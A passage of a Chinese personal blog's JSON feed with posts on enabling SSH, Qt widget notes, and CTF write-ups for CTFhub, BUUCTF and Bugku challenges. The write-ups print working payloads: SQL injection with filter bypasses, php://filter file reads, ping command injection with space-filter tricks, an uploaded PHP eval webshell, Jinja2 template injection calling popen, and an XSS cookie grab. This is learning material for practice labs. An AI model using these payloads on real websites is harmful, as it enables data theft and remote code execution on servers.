            "url": "http://dpm12345.cn/posts/9794bd28/",
            "title": "开启 ssh 远程登陆",
            "date_published": "2022-07-22T08:10:32.000Z",
            "content_html": "<h1 id=\"前提\"><a class=\"anchor\" href=\"#前提\">#</a> 前提</h1>\n<p>检查是否按章 sshd，如果没有，则</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> update</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> openssh-server</pre></td></tr></tbody></table></figure><h1 id=\"第一步-启动-ssh-服务\"><a class=\"anchor\" href=\"#第一步-启动-ssh-服务\">#</a> 第一步 启动 SSH 服务</h1>\n<p>命令为：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>/etc/init.d/ssh start</pre></td></tr></tbody></table></figure><p>或者</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">service</span> <span class=\"token function\">ssh</span> start</pre></td></tr></tbody></table></figure><p>查看 SSH 服务状态是否正常运行，命令为：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>/etc/init.d/ssh status</pre></td></tr></tbody></table></figure><p>或者</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">service</span> <span class=\"token function\">ssh</span> status</pre></td></tr></tbody></table></figure><p>有 running 说明成功启动。</p>\n<h1 id=\"第二步设置系统自动启动-ssh-服务\"><a class=\"anchor\" href=\"#第二步设置系统自动启动-ssh-服务\">#</a> 第二步：设置系统自动启动 SSH 服务</h1>\n<p><code>update-rc.d ssh enable</code> // 系统自动启动 SSH 服务</p>\n<p><code>update-rc.d ssh disabled</code> // 关闭系统自动启动 SSH 服务</p>\n<p>再次执行 <code>netstat -lnt</code>  命令则看到 22 端口成功启动</p>\n<p>可以通过 <code>sudo vim /etc/ssh/sshd_config</code>  来进行 ssh 服务的设定，如输入密码、禁用 root 等</p>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/ccf5967e/",
            "url": "http://dpm12345.cn/posts/ccf5967e/",
            "title": "CTF",
            "date_published": "2022-07-04T12:10:32.000Z",
            "content_html": "<h4 id=\"常见的网站源码备份文件后缀\"><a href=\"#常见的网站源码备份文件后缀\" class=\"headerlink\" title=\"常见的网站源码备份文件后缀\"></a>常见的网站源码备份文件后缀</h4><ul>\n<li>tar</li>\n<li>tar.gz</li>\n<li>zip</li>\n<li>rar</li>\n</ul>\n<h4 id=\"常见的网站源码备份文件名\"><a href=\"#常见的网站源码备份文件名\" class=\"headerlink\" title=\"常见的网站源码备份文件名\"></a>常见的网站源码备份文件名</h4><ul>\n<li><p>web</p>\n</li>\n<li><p>website</p>\n</li>\n<li><p>backup</p>\n</li>\n<li><p>back</p>\n</li>\n<li><p>www</p>\n</li>\n<li><p>wwwroot</p>\n</li>\n<li><p>temp</p>\n</li>\n</ul>\n<h1 id=\"CTFhub\"><a href=\"#CTFhub\" class=\"headerlink\" title=\"CTFhub\"></a>CTFhub</h1><h2 id=\"技能树-–SQL-注入\"><a href=\"#技能树-–SQL-注入\" class=\"headerlink\" title=\"技能树 –SQL 注入\"></a>技能树 –SQL 注入</h2><h3 id=\"整数型注入\"><a href=\"#整数型注入\" class=\"headerlink\" title=\"整数型注入\"></a>整数型注入</h3><p>group_concat()括号与concat紧凑</p>\n<p>步骤</p>\n<ol>\n<li><p>确定是否存在数字型注入 1 1 and 1=2；</p>\n</li>\n<li><p>确定列数</p>\n</li>\n<li><p>确定 SQL 注入位置</p>\n</li>\n<li><p>获取所有数据库名</p>\n<ol>\n<li>确定当前数据库名称 <code>1 and 1=2 union select 1,databse();</code></li>\n<li>获取所有数据库名 <code>union select 1,group_concat(schema_name)from information_schema.schemata</code></li>\n</ol>\n</li>\n<li><p>获取表名</p>\n<p><code>union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'</code></p>\n</li>\n<li><p>获取字段名名及列数</p>\n<p><code>union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'</code></p>\n</li>\n<li><p>获取数据</p>\n<p><code>union select 1,group_concat(flag) from sqli.flag</code></p>\n</li>\n</ol>\n<p>==经验==：若要访问另外一张表，那么依次要找到数据库名，表名，列名，并结果一行输出</p>\n<p>可使用以下语句</p>\n<ul>\n<li>数据库名<code>select group_concat(schema_name) from information_schema.schemata;</code></li>\n<li>表名<code>select group_concat(table_name) from information_schema.tables where table_schema='某一数据库名';</code></li>\n<li>列名<code>select group_concat(column_name) from information_schema.columns where table_schema='某一数据库名' and table_name='某一表名';</code></li>\n<li>获取数据<code>select group_concat(列名) from 数据库名.表名；</code></li>\n</ul>\n<h3 id=\"报错型注入\"><a href=\"#报错型注入\" class=\"headerlink\" title=\"报错型注入\"></a>报错型注入</h3><ul>\n<li><p><code>1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></p>\n<p><code>1 Union select count(*),concat((select flag from flag limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x</code></p>\n</li>\n<li><p><code>1 union select extractvalue(' ',concat('~', database()));</code></p>\n</li>\n</ul>\n<p>第二种情况做到最后返回值较小只有32位，flag不全，用第一种较为合适</p>\n<h1 id=\"ACTF2020-新生赛-Include1\"><a href=\"#ACTF2020-新生赛-Include1\" class=\"headerlink\" title=\"[ACTF2020 新生赛] Include1\"></a>[ACTF2020 新生赛] Include1</h1><p>文件包含</p>\n<p>url 中有<code>?file=flag.php</code>猜测文件包含漏洞，尝试</p>\n<p>文件包含直接读取的是文件，而不是文件源码，所以要想办法读取源码</p>\n<p><code>php://filter/read=convert.base64-encode/resource=xxx.php</code></p>\n<p>构造 payload</p>\n<p><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>\n<p>得到一串字母数字，base64解密</p>\n<h1 id=\"极客大挑战-2019-LoveSQL\"><a href=\"#极客大挑战-2019-LoveSQL\" class=\"headerlink\" title=\"[极客大挑战 2019] LoveSQL\"></a>[极客大挑战 2019] LoveSQL</h1><p>登陆界面，使用万能密码登陆后，显示一串密码，但这密码没用</p>\n<p>尝试username是否有注入点</p>\n<p>输入<code>?username=1' or 1=1 order by 2 %23&amp;password=1313</code></p>\n<p>输入4后发现先报错，则该表只有三个字段</p>\n<p>开始尝试</p>\n<p><code>?username=1' union select 1,2,3%23&amp;password=1313</code></p>\n<p>发现返回下图</p>\n<p>![](../../post_images/图片/[极客大挑战 2019]LoveSQL 1_1.png)</p>\n<p>说明2，3位置存在注入点</p>\n<p><code>?username=1' union select 1,database(),3%23&amp;password=1313</code></p>\n<p>根据变化，得到数据库名称为<code>geek</code></p>\n<p>再输入</p>\n<p><code>?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'%23&amp;password=1313</code></p>\n<p>得到</p>\n<p>![](../../post_images/图片/[极客大挑战 2019]LoveSQL 1_2.png)</p>\n<p>可知两个表的名称为<code>geekuser</code>和<code>l0ve1ysq1</code>，进行尝试</p>\n<p><code>?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='geekuser'%23&amp;password=1313</code> <code>?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1'%23&amp;password=1313</code></p>\n<p>发现返回都是如此</p>\n<p>![](../../post_images/图片/[极客大挑战 2019]LoveSQL 1_3.png)</p>\n<p>猜测答案在password中</p>\n<p>于是<code>?username=1' union select 1,2,group_concat(password) from geekuser%23&amp;password=1313</code></p>\n<p>![](../../post_images/图片/[极客大挑战 2019]LoveSQL 1_4.png)</p>\n<p>并不是想要的，换一个表</p>\n<p><code>?username=1' union select 1,2,group_concat(password) from l0ve1ysq1%23&amp;password=1313</code></p>\n<p>得到</p>\n<p>![](../../post_images/图片/[极客大挑战 2019]LoveSQL 1_5.png)</p>\n<p>滑动滚动条，得到</p>\n<p><code>flag{957f158f-4f70-4e6c-83b5-98bb9a339888}</code></p>\n<h1 id=\"极客大挑战-2019-Http\"><a href=\"#极客大挑战-2019-Http\" class=\"headerlink\" title=\"[极客大挑战 2019] Http\"></a>[极客大挑战 2019] Http</h1><p>referer 从哪来</p>\n<p>X-forwarded-for 哪个 ip</p>\n<h1 id=\"极客大挑战-2019-BabySQL\"><a href=\"#极客大挑战-2019-BabySQL\" class=\"headerlink\" title=\"[极客大挑战 2019] BabySQL\"></a>[极客大挑战 2019] BabySQL</h1><p>本题最重要的是要找到注入点和其过滤的方法</p>\n<p>进入后发现很多都被过滤了<code>union</code>、<code>select</code></p>\n<p>这里需要知道一种过滤方法是<code>replace()</code>, 找到某个词即转换为空，这样的话可以用双写</p>\n<p><code>?username=1&amp;password=dwa %27 ununionion seselectlect 1 %23</code></p>\n<p>返回</p>\n<p>![](../../post_images/图片/[极客大挑战 2019]BabySQL_1.png)</p>\n<p>说明字段数不同，尝试后，发现为3个，那么类似于上面的一种做法，但在写语句过程中</p>\n<p>发现同样对<code>or</code>，<code>from</code>,<code>where</code>进行了过滤，但针对库<code>geek</code>，始终过不去</p>\n<p>查找其他的数据库</p>\n<p><code>?username=1&amp;password=6 %27 ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata %23</code></p>\n<p>![](../../post_images/图片/[极客大挑战 2019]BabySQL_2.png)</p>\n<p>于是猜想flag在ctf库中，接下来都是类似于前面的语句</p>\n<p><code>?username=1&amp;password=6 %27 ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf' %23</code></p>\n<p>得到Flag表</p>\n<p><code>?username=1&amp;password=6 %27 ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema='ctf' aandnd table_name='Flag' %23</code></p>\n<p>发现对<code>and</code>过滤，双写</p>\n<p><code>?username=1&amp;password=6 %27 ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema='ctf' aandnd table_name='Flag' %23</code></p>\n<p>得到flag列</p>\n<p>最后</p>\n<p><code>?username=1&amp;password=6 %27 ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag %23</code></p>\n<p>得到 flag</p>\n<p>![](../../post_images/图片/[极客大挑战 2019]BabySQL_3.png)</p>\n<p><code>flag{ec94662d-77b8-4e18-a85b-b65b493f0278}</code></p>\n<h1 id=\"极客大挑战-2019-Secret-File\"><a href=\"#极客大挑战-2019-Secret-File\" class=\"headerlink\" title=\"[极客大挑战 2019] Secret File\"></a>[极客大挑战 2019] Secret File</h1><p>查看源代码，发现有个Archive_room.php，点击进入，再点击secret，发现进入了end.php</p>\n<p>回到原来页面，发现secret指向为action.php, 在网址上输入查看action.php的源码，发现还是跳转到了end.php</p>\n<p>那么猜测使用burp抓包，抓包发现secr3t.php 同时发现过滤file，输入，提示flag在flag.php里，</p>\n<p>然后再进入新的页面，提示找到了，但看不见 用php伪协议来读取flag.php</p>\n<p><code>http://285c8b3f-4619-4f12-8e22-962f7ee1fe8d.node4.buuoj.cn:81/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p>\n<p>得到base64码，解密得到flag</p>\n<p>使用php伪协议去读取的原因？</p>\n<p>返回审计php代码，发现文件包含，结合题目一下想到的文件隐藏，于是我们猜测flag在后端文件中，并需要我们去读取他，传入的file经过了过滤，但是没有过滤filter</p>\n<h1 id=\"ACTF2020-新生赛-Exec\"><a href=\"#ACTF2020-新生赛-Exec\" class=\"headerlink\" title=\"[ACTF2020 新生赛] Exec\"></a>[ACTF2020 新生赛] Exec</h1><p>先ping本地地址得到返回值（linux 命令执行）</p>\n<p><code>127.0.0.1 &amp; cat /flag</code></p>\n<p>涉及到相关管道符知识</p>\n<p><code>|</code>(按位或) 执行后面一条语句</p>\n<p><code>||</code>(逻辑或)先执行前面一条，若成功则不执行后面，若错误则执行后面</p>\n<p><code>&amp;</code>(按位与）两个都执行</p>\n<p><code>&amp;&amp;</code>逻辑与</p>\n<h1 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h1><p><code>?id=127.0.0.1|ls</code></p>\n<p>可查看文件为flag.php和index.php</p>\n<p>尝试进入，发现空格被过滤a</p>\n<p>绕过空格过滤的方法</p>\n<pre><code class=\"raw\">\n$IFS${IFS}\n$IFS$1 //1 改 成 1 改成 1 改成加其他数字貌似都行\n&lt;\n&lt;&gt;\n{cat,flag.php} // 用逗号实现了空格功能\n%20\n%09\n</code></pre>\n<p>看看到底哪些被过滤了</p>\n<p><code>http://5aea2a6a-29ef-4685-8e7e-d6f392de2941.node4.buuoj.cn:81/?ip=1|cat$IFS$1index.php</code></p>\n<p>![](../../post_images/图片/[GXYCTF2019]Ping Ping Ping_1.png)</p>\n<p>发现少了一部分if，查看源码</p>\n<p>![](../../post_images/图片/[GXYCTF2019]Ping Ping Ping_2.png)</p>\n<p>发现过滤了很多标点符号，同时也过滤了flag的查询</p>\n<p>代码中有<code>$a</code>这里采用变量覆盖</p>\n<p><code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></p>\n<p>查看源码，得到 flag</p>\n<h1 id=\"极客大挑战-2019-Upload\"><a href=\"#极客大挑战-2019-Upload\" class=\"headerlink\" title=\"[极客大挑战 2019] Upload\"></a>[极客大挑战 2019] Upload</h1><p>该题是文件上传，先上传一个txt文件，发现提示<code>no image</code></p>\n<p>那么将后缀改为.jpg，还是无法成功</p>\n<p>上传一句话木马，并将文件后缀改为.phtml，上传过程抓包修改上传格式</p>\n<p>![](../../post_images/图片/[极客大挑战 2019]Upload_1.png)</p>\n<p>这里改为<code>Content-Type: image/jpg</code></p>\n<p>如<code>GIF89a&lt;script language=\"php\"&gt;eval($_POST['shell']);&lt;/script&gt;</code>密码即为<code>shell</code></p>\n<p>![](../../post_images/图片/[极客大挑战 2019]Upload_2.png)</p>\n<p>上传成功</p>\n<p>然后蚁剑连接，猜测上传的文件位于 /upload/1.phtml</p>\n<p><code>http://a11a2c79-5a21-404b-83d6-d43a3b9d5a57.node4.buuoj.cn:81/upload/1.phtml</code></p>\n<p>在根目录下找到flag</p>\n<p>同样<code>[ACTF2020 新生赛] Upload</code>也是此思路，抓包改格式，然后蚁剑连接</p>\n<h1 id=\"FLASK-SSTI\"><a href=\"#FLASK-SSTI\" class=\"headerlink\" title=\"[FLASK]SSTI\"></a>[FLASK]SSTI</h1><p>尝试输入<code>name=4</code></p>\n<p>发现返回<code>hello 4</code></p>\n<p>存在SSTI漏洞</p>\n<h2 id=\"手工注入\"><a href=\"#手工注入\" class=\"headerlink\" title=\"手工注入\"></a>手工注入</h2><p><img data-src=\"/../../post_images/%E5%9B%BE%E7%89%87/%5BFLASK%5DSSTI.png\" alt=\"[FLASK] SSTI\"></p>\n<pre><code class=\"python\">{ % for c in [].__class__.__base__.subclasses__() % }\n</code></pre>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/b511cbcf/",
            "url": "http://dpm12345.cn/posts/b511cbcf/",
            "title": "Qt",
            "date_published": "2022-06-21T12:46:09.000Z",
            "content_html": "<h1 id=\"操作\"><a href=\"#操作\" class=\"headerlink\" title=\"操作\"></a>操作</h1><h2 id=\"设置控件根据内容自动调整大小\"><a href=\"#设置控件根据内容自动调整大小\" class=\"headerlink\" title=\"设置控件根据内容自动调整大小\"></a>设置控件根据内容自动调整大小</h2><p><code>adjustSize()</code>方法</p>\n<p>将会根据内容自动调整大小，需将该方法调用放在设置内容之后，否则调整的大小为之前的内容适应大小</p>\n<h2 id=\"设置窗口大小不可改变\"><a href=\"#设置窗口大小不可改变\" class=\"headerlink\" title=\"设置窗口大小不可改变\"></a>设置窗口大小不可改变</h2><pre><code class=\"c++\">this-&gt;setWindowFlags (Qt::MSWindowsFixedSizeDialogHint); // 最大化没有，但仍能通过右下角改变大小 \n\nthis-&gt;setFixedSize (this-&gt;geometry ().size ()); // 最大化和右下角变化都没有\n</code></pre>\n<h2 id=\"设置字体样式\"><a href=\"#设置字体样式\" class=\"headerlink\" title=\"设置字体样式\"></a>设置字体样式</h2><p>首先需要创建 QFont 类对象</p>\n<ul>\n<li><code>setFamily(const QString &amp;)</code>设置字体类型 </li>\n<li><code>setPointSize(int)</code>设置字体大小</li>\n</ul>\n<p>之后调用<code>setFont(const QFont &amp;)</code>方法设置字体</p>\n<h2 id=\"设置是否可见\"><a href=\"#设置是否可见\" class=\"headerlink\" title=\"设置是否可见\"></a>设置是否可见</h2><p><code>setVisible(bool)</code> true 为可见，false 为不可见</p>\n<p><code>setHidden(bool)</code> true 为不可见，false 为可见！</p>\n<p>可通过<code>isVisible()</code>,<code>isHidden()</code>查询状态</p>\n<h2 id=\"TextEdit\"><a href=\"#TextEdit\" class=\"headerlink\" title=\"TextEdit\"></a>TextEdit</h2><ul>\n<li><p><code>clear()</code> 清空所有内容</p>\n</li>\n<li><p><code>setText(const QString &amp;text)</code> 设置文本编辑框内容，会覆盖原有内容</p>\n</li>\n<li><p><code>setGeometry(int ax, int ay, int w, int h)</code> 设置文本编辑框的位置及大小，依次为 x，y，宽，高，其中 x ()，y (),width (),height (), 获取控件的这四个值</p>\n</li>\n<li><p><code>append(const QString &amp;text)</code> 追加内容，会在文本编辑框中另起一行，添加内容，不会覆盖原有内容</p>\n</li>\n</ul>\n<h2 id=\"当窗口大小放生变化时进行其他控件的大小改变\"><a href=\"#当窗口大小放生变化时进行其他控件的大小改变\" class=\"headerlink\" title=\"当窗口大小放生变化时进行其他控件的大小改变\"></a>当窗口大小放生变化时进行其他控件的大小改变</h2><p>重写继承自<code>QWidget</code>的虚函数<code>virtual void resizeEvent (QResizeEvent *event);</code></p>\n<p>在不设置布局的情况下手动改变大小</p>\n<h1 id=\"报错\"><a href=\"#报错\" class=\"headerlink\" title=\"报错\"></a>报错</h1><h2 id=\"QObject-connect-Cannot-queue-arguments-of-type\"><a href=\"#QObject-connect-Cannot-queue-arguments-of-type\" class=\"headerlink\" title=\"QObject::connect: Cannot queue arguments of type\"></a>QObject::connect: Cannot queue arguments of type</h2><h3 id=\"原因\"><a href=\"#原因\" class=\"headerlink\" title=\"原因\"></a>原因</h3><p>当一个 signal 被放到队列中（queued）时，它的参数 (arguments) 也会被一起一起放到队列中（queued 起来），这就意味着参数在被传送到 slot 之前需要被拷贝、存储在队列中（queue）中；为了能够在队列中存储这些参数 (argument)，Qt 需要去 construct、destruct、copy 这些对象，而为了让 Qt 知道怎样去做这些事情，参数的类型需要使用 qRegisterMetaType 来注册（如错误提示中的说明）</p>\n<h3 id=\"解决方法\"><a href=\"#解决方法\" class=\"headerlink\" title=\"解决方法\"></a>解决方法</h3><p>在使用该类型的文件中包含头文件<code>QMetatype</code>，并且在构造函数中注册</p>\n<p>如，我在<code>Myclass</code>类中使用了自定义结构体<code>info</code>，<code>QVector</code>，如果不进行以上操作，会产生以上报错，改正内容为</p>\n<pre><code class=\"c++\">#include&lt;QMetatype&gt;\n\nclass Myclass{\n    Myclass();\n    ~Myclass();\n    ···\n    ···\n}\n\nMyclass::Myclass()\n{\n    qRegisterMetaType&lt;QVector&lt;info&gt;&gt;(\"QVector&lt;info&gt;\");\n    // 双引号的内容即为使用的内容，即定义类型\n}\n</code></pre>\n<h2 id=\"Widgets-cannot-be-moved-to-a-new-thread\"><a href=\"#Widgets-cannot-be-moved-to-a-new-thread\" class=\"headerlink\" title=\"Widgets cannot be moved to a new thread\"></a>Widgets cannot be moved to a new thread</h2>",
            "tags": [
                "Qt"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/78c2084b/",
            "url": "http://dpm12345.cn/posts/78c2084b/",
            "title": "sql_sum",
            "date_published": "2022-06-06T12:01:48.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<ul>\n<li>正常流程\n<ul>\n<li><code>select database();</code>    获取数据库名</li>\n<li><code>select group_concat(schema_name) from information_schema.schemata;</code>  获取所有的数据库名</li>\n<li><code>select group_concat(table_name) from information_schema.tables where table_schema = database();</code>  获取指定数据库中所有表名</li>\n<li><code>select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'xxx';</code>  获得指定表中的所有字段名</li>\n<li><code>select group_concat('xxx') from dataname.tablename;</code>   获得指定表中的指定字段的所有内容</li>\n</ul>\n</li>\n<li>匹配字符串\n<ul>\n<li><code>where xxx = 'xxx'</code></li>\n<li><code>having xxx = 'xxx'</code></li>\n<li><code>xxx regexp('xxx')</code>  利用正则匹配</li>\n<li><code>substr(str,start,len)</code>  获取 str 字符串从 start 开始 (初始下标从 1 开始) 的 len 个字符</li>\n<li><code>left(str,len)</code> 、 <code>right(str,len)</code>  从左 / 右开始数 len 个字符</li>\n</ul>\n</li>\n<li>假设有过滤\n<ul>\n<li>replace 过滤为空：由于该过滤只将匹配到的进行替换，故可通过双写绕过，如 <code>seselectlect</code>  过滤后得到 <code>select</code></li>\n<li>过滤空格，绕过手段 <code>(),%0a,%a0,%0c,%0d,反引号,/**/</code></li>\n<li>过滤 <code>=</code> ，可以使用 <code>like</code> , <code>regexp</code>  正则匹配</li>\n<li></li>\n</ul>\n</li>\n<li>特殊情况\n<ul>\n<li><code>select * from 'admin' where password=md5($pass,true)</code>  此种情况为使用字符串 <code>pass=ffifdyop</code> ,sql 接收后会将其 hex 解码，从而获得 <code>' or '6xxxxx'</code>  语句，得到一个永真式，绕过 md5 判断</li>\n</ul>\n</li>\n<li>文件操作\n<ul>\n<li><code>select load_file(xxx);</code>  读文件</li>\n<li><code>select xxx into outfile \"xxx\"</code>  写文件，前提是要有写文件权限</li>\n<li></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/7c4ba2c4/",
            "url": "http://dpm12345.cn/posts/7c4ba2c4/",
            "title": "Bugku CTF",
            "date_published": "2022-04-08T02:10:32.000Z",
            "content_html": "<h1 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h1><p>关注公众号即可获得</p>\n<h1 id=\"Simple-SSTI-1\"><a href=\"#Simple-SSTI-1\" class=\"headerlink\" title=\"Simple_SSTI_1\"></a>Simple_SSTI_1</h1><p>简单的SSTI</p>\n<p>首先根据题目提示，要传入flag的值，故先尝试<code>?flag={{2*2}}</code>, 得到返回值4<br>之后再进行SSTI模板注入</p>\n<pre><code class=\"raw\">{{''.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__['popen']('ls').read()}}\n</code></pre>\n<p>实际上方法有很多，主要是要找到popen或os或builtins<br>比如</p>\n<pre><code class=\"raw\">{{''.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[\"__builtins__\"].eval('__import__(\"os\").popen(\"ls\").read()')}}\n</code></pre>\n<h1 id=\"社工-进阶收集\"><a href=\"#社工-进阶收集\" class=\"headerlink\" title=\"社工 - 进阶收集\"></a>社工 - 进阶收集</h1><p>看到图说实话并不知道在哪</p>\n<p>百度识图可以知道该地点为西安大雁塔，于是搜索附近的地铁</p>\n<p>在西安地铁上找，先找到大雁塔的地铁站，然后由于主人公做了七站，并中途转了一站，而且又是从始发站出发的<br>综合以上特点，可知坐地铁的站点为韦曲南站，以此为中心，画半径800米的圆，然后再以下一站为中心，画半径1km的圆</p>\n<p>找寻两圆重合部分的小区，一个一个试，最终发现为兰乔国际城</p>\n<h1 id=\"Simple-SSTI-2\"><a href=\"#Simple-SSTI-2\" class=\"headerlink\" title=\"Simple_SSTI_2\"></a>Simple_SSTI_2</h1><p>同 1 的解法</p>\n<h1 id=\"Flask-FileUpload\"><a href=\"#Flask-FileUpload\" class=\"headerlink\" title=\"Flask_FileUpload\"></a>Flask_FileUpload</h1><p>具体思想还是一样</p>\n<p>由于返回在注释中</p>\n<p>使用bp抓包，时刻观察返回值较为方便，代码同Simple_SSTI_1</p>\n<h1 id=\"留言板\"><a href=\"#留言板\" class=\"headerlink\" title=\"留言板\"></a>留言板</h1><p>过滤了很多</p>\n<p>按照题目意思需要使用XSS平台来获取flag，但这里暂时不搭建，之后有空在搭</p>\n<p>查找网上资料可以获得数据库的用户名和密码分别为<code>admin,011be4d65feac1a8</code></p>\n<p>登录成功后能够正确执行之前输入的script脚本</p>\n<p>其中flag在cookie中，可以<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>\n<h1 id=\"1-和-0-的故事\"><a href=\"#1-和-0-的故事\" class=\"headerlink\" title=\"1 和 0 的故事\"></a>1 和 0 的故事</h1><p>转二维码，利用 python</p>\n<pre><code class=\"python\">from PIL import Image\nMAX = 25\n# 二维码大小\npic = Image.new(\"RGB\", (MAX, MAX))\nstr = \"\"\"0000000001110010000000000\n0000000000011110100000000\n0000000001110001000000000\n0000000010111100000000000\n0000000010101010000000000\n0000000001100010100000000\n0000000010101010100000000\n0000000001000001100000000\n1100011101110110100011000\n0001000010110010010010100\n0100111101000011101110011\n0011110100101011001001001\n1000001001100001001101000\n1111000111111011100101000\n1011011111001101111110111\n1000110110010010101101100\n1000111100111111111110111\n0000000010110001100010100\n0000000010010100101010001\n0000000010101010100011001\n0000000000100111111110010\n0000000000011001011110111\n0000000001001100100100001\n0000000011000011011011001\n0000000011010000101110101\n\"\"\"\n# str 为获取的 01 片段\ni = 0\nfor y in range(0, MAX):\n    for x in range(0, MAX):\n        if(str[i] == '1'):\n            pic.putpixel([x, y], (0, 0, 0))\n        else:\n            pic.putpixel([x, y], (255, 255, 255))\n        i = i+1\n\npic.save(\"2.png\")\n# 由于直接预览分辨率太低，所以保存下来观看\n</code></pre>\n<p>打开后发现确实定位图，使用ps补全，扫码得到flag</p>\n<pre><code class=\"raw\">flag{QR_c0de_1s_1nterest1n9}\n</code></pre>\n<h1 id=\"easy-nbt\"><a href=\"#easy-nbt\" class=\"headerlink\" title=\"easy_nbt\"></a>easy_nbt</h1><ol>\n<li>搜索nbt，可知该文件为我的世界二进制命名标签<br>知道有nbtexplorer可以打开该类文件，打开level.dat，搜索flag，找到flag</li>\n<li>将level.dat 转换为7z后缀，解压后打开其中的文件，搜索flag，得到flag</li>\n<li>binwalk打开</li>\n</ol>\n<pre><code class=\"bash\">binwalk -e level.dat strings 0 | grep 'flag'\n</code></pre>\n<p>最后 flag 为</p>\n<pre><code class=\"raw\">flag{Do_u_kN0w_nbt?}\n</code></pre>\n<h1 id=\"抄错的字符\"><a href=\"#抄错的字符\" class=\"headerlink\" title=\"抄错的字符\"></a>抄错的字符</h1><p>由所给字符，判断为 base64 解码，根据小明烦的错误，列举可能的抄错情况，利用脚本跑出</p>\n<p>最终正确的 base64 编码为 <code>QW1hbl92ZXJ5X2Nvb2w</code></p>\n<h1 id=\"x2F\"><a href=\"#x2F\" class=\"headerlink\" title=\"/.-\"></a>/.-</h1><p>根据题目内容很容易猜到时摩斯密码<br>这里使用的在线解密网站为<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5hbGwtdG9vbC5jbi9Ub29scy9tb3JzZS8=\">点这里</span><br>解密后得到</p>\n<pre><code class=\"raw\">FLAG% u7bD3FCBF17F9399504% u7d 将 `% u7b`,`% u7d` 分别转换为 `{`,`}`\n</code></pre>\n<p><code>7b</code> 和 <code>7d</code> 为左右花括号的 ascii 码，于是将<code>%u7b</code> , <code>%u7d</code> 分别转换为<code>{</code> , <code>}</code>, 并把 <code>FLAG</code> 改小写，提交</p>\n<p>flag错误</p>\n<p>再将其他大写均转为小写，提交，成功</p>\n<p>故 flag 为:</p>\n<pre><code class=\"raw\">flag{d3fcbf17f9399504}\n</code></pre>\n<h1 id=\"聪明的小羊\"><a href=\"#聪明的小羊\" class=\"headerlink\" title=\"聪明的小羊\"></a>聪明的小羊</h1><p>根据题目介绍，知道为栅栏解密，且栅栏数为 2</p>\n<p>解密得到 flag</p>\n<pre><code class=\"raw\">flag{6fde4163df05d900}\n</code></pre>\n<h1 id=\"ok\"><a href=\"#ok\" class=\"headerlink\" title=\"ok\"></a>ok</h1><p>下载附件，打开后发现一堆Ook</p>\n<p>站内有 Brainfuck/OoK 解密工具，这个网站也可以用<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3BsaXRicmFpbi5vcmcvc2VydmljZXMvb29r\">Brainfuck/Ook!Obfuscation/Encoding splitbrain.org</span></p>\n<p>点击 ook to test 解密后得到</p>\n<pre><code class=\"raw\">flag{0a394df55312c51a}\n</code></pre>\n<h1 id=\"lt-gt\"><a href=\"#lt-gt\" class=\"headerlink\" title=\"[+-<>]\"></a>[+-&lt;&gt;]</h1><p>同上文网址[ Brainfuck/Ook! Obfuscation/Encoding <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3BsaXRicmFpbi5vcmcvc2VydmljZXMvb29r\">splitbrain.org]</span></p>\n<p>点击 Brainfuvk to text，得到 flag</p>\n<pre><code>flag{0d86208ac54fbf12}\n</code></pre>\n<h1 id=\"滑稽\"><a href=\"#滑稽\" class=\"headerlink\" title=\"滑稽\"></a>滑稽</h1><p>源代码中的注释</p>\n<h1 id=\"计算器\"><a href=\"#计算器\" class=\"headerlink\" title=\"计算器\"></a>计算器</h1><p>修改 html 源码中的文本框的 maxlenth 